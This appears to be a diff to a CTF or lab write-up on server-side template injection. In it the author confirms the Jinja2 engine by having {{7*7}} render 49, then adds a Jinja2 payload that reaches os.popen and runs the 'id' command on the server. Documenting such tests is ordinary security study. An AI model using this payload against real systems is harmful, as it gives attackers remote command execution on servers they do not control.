@@ -231,3 +231,8 @@ Using the payload `{{7*7}}` rendered the response `49`
 
 And since this specific payload worked this makes me think this is probably jinja2 (python).
 
+```python
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+```
+Ive found this payload online and testing it:
+
